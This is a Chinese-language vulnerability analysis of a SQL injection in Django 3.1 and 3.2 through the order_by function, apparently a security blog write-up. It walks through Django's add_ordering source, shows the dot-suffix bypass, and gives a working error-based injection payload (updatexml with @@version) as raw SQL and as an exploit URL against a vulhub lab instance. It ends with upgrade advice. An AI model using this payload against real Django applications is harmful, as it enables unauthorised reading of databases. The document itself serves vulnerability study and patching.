## 一、漏洞详情

Django是Python
Web中最流行的几个框架之一。Django中QuerySet数据合集的order_by函数存在SQL注入漏洞。如果攻击者可以控制order_by传入的值，那么就可以注入恶意SQL语句造成SQL注入漏洞。

 **漏洞影响** ：django 3.1、3.2

###

## 二、漏洞分析

### 1\. Django的models概念

在Django中，想要在数据库中创建表并定义字段是容易的，只需要在models.py文件中声明一个模型类即可。如下图所示，这里定义了一个叫Collection的表，表中有一个叫name的字段。![1629163538_611b1012717cbefa77160.png!small?1629163537753](https://image.3001.net/images/20210817/1629163538_611b1012717cbefa77160.png!small?1629163537753)

![1629163575_611b10378e30740f6fc9a.png!small?1629163574902](https://image.3001.net/images/20210817/1629163575_611b10378e30740f6fc9a.png!small?1629163574902)

### 2\. QuerySet与order_by

Django内置了一个ORM框架，从数据库查询出来的结果是一个合集，这个合集就是QuerySet。而order_by这个方法的作用，一般是将查询出来的结果按照某字段的值，由小到大或由大到小进行排序。如下图所示，在views.py的视图函数中，先是获取到了用户传入的参数值order（如果没有传入参数默认值为id）。然后到Collection表中进行数据查询，对返回的结果按照id值从小到大进行排序。

![1629163561_611b1029455bf4fe1f925.png!small?1629163560592](https://image.3001.net/images/20210817/1629163561_611b1029455bf4fe1f925.png!small?1629163560592)

最后使用values()函数将数据合集转化成一个一个json的数据格式返回。

![1629163599_611b104fd2b93e21cd605.png!small?1629163599116](https://image.3001.net/images/20210817/1629163599_611b104fd2b93e21cd605.png!small?1629163599116)

### 3\. 判断是否使用了order_by

比如返回的结果按照id值排序`Collection.objects.order_by('id')`，默认是从小到大的顺序。如果想要变成从大到小，只需要把`'id'变成'-id'`即可。因此可以通过在参数值前面加`'-'`来判断，如果返回的顺序颠倒了那么就是使用了order_by。如下图所示。

![1629163622_611b10664ef49de6a668e.png!small?1629163621624](https://image.3001.net/images/20210817/1629163622_611b10664ef49de6a668e.png!small?1629163621624)

### 4\. 源码分析

当运行到`Collection.objects.order_by('id')`的时候，主要是进入如下函数来判断order_by 的排序顺序和表达式。

    
    
    def add_ordering(self, *ordering):
            """
            Add items from the 'ordering' sequence to the query's "order by"
            clause. These items are either field names (not column names) --            possibly with a direction prefix ('-' or '?') -- or OrderBy
            expressions.
    ​
            If 'ordering' is empty, clear all ordering from the query.
            """
            errors = []
            for item in ordering:
                if isinstance(item, str):
                    if '.' in item:
                        warnings.warn(
                            'Passing column raw column aliases to order_by() is '
                            'deprecated. Wrap %r in a RawSQL expression before '
                            'passing it to order_by().' % item,
                            category=RemovedInDjango40Warning,
                            stacklevel=3,
                        )
                        continue
                    if item == '?':
                        continue
                    if item.startswith('-'):
                        item = item[1:]
                    if item in self.annotations:
                        continue
                    if self.extra and item in self.extra:
                        continue
                    # names_to_path() validates the lookup. A descriptive
                    # FieldError will be raise if it's not.
                    self.names_to_path(item.split(LOOKUP_SEP), self.model._meta)
                elif not hasattr(item, 'resolve_expression'):
                    errors.append(item)
                if getattr(item, 'contains_aggregate', False):
                    raise FieldError(
                        'Using an aggregate in order_by() without also including '
                        'it in annotate() is not allowed: %s' % item
                    )
            if errors:
                raise FieldError('Invalid order_by arguments: %s' % errors)
            if ordering:
                self.order_by += ordering
            else:
                self.default_ordering = False

在add_ordering()函数中，进行如下了五个判断：字段中是否带点、字段是否为问号、字段开头是否为短横杠、判断是否在一个map字典、判断是否有额外的参数信息。如果全部参数无异常会进入`self.names_to_path`中进行数据获取，并进行相关逻辑处理，这个过程是不会进行SQL注入拼接的。

当用户输入的字段中带了点`'id.'`，就会跳出循环进入到`_fetch_all`中，这个时候会进行SQL查询：

    
    
    SELECT "vuln_collection"."id", "vuln_collection"."name" FROM "vuln_collection" ORDER BY ("id".) ASC。

![1629163750_611b10e665863b4c75d99.png!small?1629163749822](https://image.3001.net/images/20210817/1629163750_611b10e665863b4c75d99.png!small?1629163749822)

可以看到会把点带进查询。也就是说把`'id.'`进行了拼接。因此可以尝试闭合语句并配合debug回显进行报错注入：

    
    
    SELECT "vuln_collection"."id", "vuln_collection"."name" FROM "vuln_collection" ORDER BY (vuln_collection.id);select updatexml(1,concat(0x7e,(select @@version)),1);# ASC

![1629163770_611b10fa294a0faa88763.png!small?1629163769544](https://image.3001.net/images/20210817/1629163770_611b10fa294a0faa88763.png!small?1629163769544)

###

## 三、漏洞利用

### 利用vulhub启动漏洞环境。

![1629163785_611b11094eb31c9680e5a.png!small?1629163785400](https://image.3001.net/images/20210817/1629163785_611b11094eb31c9680e5a.png!small?1629163785400)

通过

`'-'`

### 判断order_by：

![1629163795_611b111354cc62e856b4f.png!small?1629163794616](https://image.3001.net/images/20210817/1629163795_611b111354cc62e856b4f.png!small?1629163794616)

### 闭合方法：

APP名_数据库名.数据库存在的字段名);

    
    
    http://192.168.2.129:8000/vuln/?order=vuln_collection.id);select%20updatexml(1,concat(0x7e,(select%20@@version)),1)%23

![1629163807_611b111f5559fe1288d02.png!small?1629163806725](https://image.3001.net/images/20210817/1629163807_611b111f5559fe1288d02.png!small?1629163806725)

###

## 四、漏洞修复

升级到3.2以上的安全版本。

